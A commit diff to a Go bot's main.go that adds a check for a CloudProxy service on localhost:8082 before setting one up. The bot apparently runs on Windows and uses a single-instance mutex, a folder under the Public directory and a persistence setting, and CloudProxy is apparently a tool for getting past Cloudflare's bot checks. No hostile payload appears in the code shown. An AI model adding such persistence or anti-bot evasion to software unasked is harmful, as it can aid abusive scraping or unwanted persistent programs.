Check CloudProxy exist

+++ bot/main.go
@@ -6,6 +6,7 @@ import (
 	"math"
 	"math/big"
 	"math/rand"
+	"net/http"
 	"os"
 	"syscall"
 	"time"
@@ -22,30 +23,33 @@ func main() {
 	if _, err := CreateMutex("tag"); err != nil {
 		os.Exit(0)
 	}
-	for {
-		err := SetupCloudProxy()
-		if err == nil {
-			break
-		}
-		fmt.Println(err)
-		err = os.RemoveAll(os.Getenv("public") + "\\" + tag)
-		if err != nil {
-			fmt.Println(err)
-			os.Exit(0)
-		}
-	}
-	errorChan := make(chan error)
-	go CloudProxy(errorChan)
-	go func(errChan <-chan error) {
+
+	if !CloudProxyExist() {
 		for {
-			err := <- errChan
+			err := SetupCloudProxy()
+			if err == nil {
+				break
+			}
+			fmt.Println(err)
+			err = os.RemoveAll(os.Getenv("public") + "\\" + tag)
 			if err != nil {
 				fmt.Println(err)
 				os.Exit(0)
 			}
 		}
-	}(errorChan)
-	time.Sleep(time.Second * 3)
+		errorChan := make(chan error)
+		go CloudProxy(errorChan)
+		go func(errChan <-chan error) {
+			for {
+				err := <- errChan
+				if err != nil {
+					fmt.Println(err)
+					os.Exit(0)
+				}
+			}
+		}(errorChan)
+		time.Sleep(time.Second * 3)
+	}
 
 	var config Config
 	var persistence Persistence
@@ -85,6 +89,24 @@ func CreateMutex(name string) (uintptr, error) {
 		return ret, nil
 	default:
 		return ret, err
+	}
+}
+
+func CloudProxyExist() bool {
+	request, err := http.NewRequest("POST", "http://localhost:8082/v1", nil)
+	if err != nil {
+		return false
+	}
+	request.Header.Add("Content-Type", "application/json")
+
+	client := http.Client{
+		Timeout: time.Minute * 5,
+	}
+	_, err = client.Do(request)
+	if err != nil {
+		return false
+	} else {
+		return true
 	}
 }
